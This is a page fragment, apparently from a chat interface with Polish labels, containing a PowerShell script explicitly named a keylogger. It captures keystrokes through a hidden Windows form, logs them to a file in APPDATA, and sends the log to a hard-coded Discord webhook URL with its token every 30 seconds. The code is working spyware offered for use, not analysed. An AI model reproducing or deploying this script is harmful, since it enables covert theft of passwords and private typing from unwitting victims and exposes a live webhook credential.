20.378 6.10476 20.3159L8.97693 19.8372C9.72813 19.712 10.1037 19.6494 10.4542 19.521C10.7652 19.407 11.0608 19.2549 11.3343 19.068C11.6425 18.8575 11.9118 18.5882 12.4503 18.0497L20 10.5C21.3807 9.11929 21.3807 6.88071 20 5.5C18.6193 4.11929 16.3807 4.11929 15 5.5L7.45026 13.0497C6.91175 13.5882 6.6425 13.8575 6.43197 14.1657C6.24513 14.4392 6.09299 14.7348 5.97903 15.0458C5.85062 15.3963 5.78802 15.7719 5.66282 16.5231Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path><path d="M14.5 7L18.5 11" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg>Edytuj</button></span></div></div></div><div class="overflow-y-auto p-4" dir="ltr"><code class="whitespace-pre! language-powershell"><span>Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Ścieżka do pliku logu
$logPath = "$env:APPDATA\keylogger.txt"

# Webhook Discorda
$webhook = "https://discord.com/api/webhooks/1360942823821803540/9I6AgpJboKwPSgnCIfbxFshdEwhYTyOHrlYrNlnY-UkJvc1SjTyAtEu-8-KEyWv3iCuU"

# Zmienna globalna na bufor klawiszy
$global:loggedKeys = ""

# Zapis do pliku
function Save-Log {
    $global:loggedKeys | Out-File -Append -Encoding UTF8 -FilePath $logPath
    $global:loggedKeys = ""
}

# Funkcja do wysyłania logów na Discord
function Send-To-Discord {
    if (Test-Path $logPath) {
        $content = Get-Content $logPath -Raw
        if ($content.Trim().Length -gt 0) {
            $maxLen = 1900
            if ($content.Length -gt $maxLen) {
                $content = $content.Substring(0, $maxLen) + "`n[...]"
            }

            $payload = @{
                "content" = "📝 **Keylogger log:**`n```\n$content\n```"
            } | ConvertTo-Json -Depth 10

            try {
                Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json'
                Clear-Content -Path $logPath
            } catch {
                Write-Host "❌ Błąd wysyłania na Discorda: $_"
            }
        }
    }
}

# Timer do wysyłania logów co 30 sekund
$sendTimer = New-Object System.Timers.Timer
$sendTimer.Interval = 30000
$sendTimer.AutoReset = $true
$sendTimer.add_Elapsed({ Send-To-Discord })
$sendTimer.Start()

# Hook na zdarzenia klawiszy
$form = New-Object Windows.Forms.Form
$form.WindowState = "Minimized"
$form.ShowInTaskbar = $false
$form.Add_KeyDown({
    param($sender, $e)
    $key = $e.KeyCode.ToString()
    if ($e.Control -and $e.KeyCode -eq "C") { $key = "[Ctrl+C]" }
    $global:loggedKeys += $key + " "
    if ($global:loggedKeys.Length -gt 50) {
        Save-Log
    }
})

# Uruchomienie "nasłuchiwania"
$form.Add_Shown({ $form.Hide() })
[void]$form.ShowDialog()
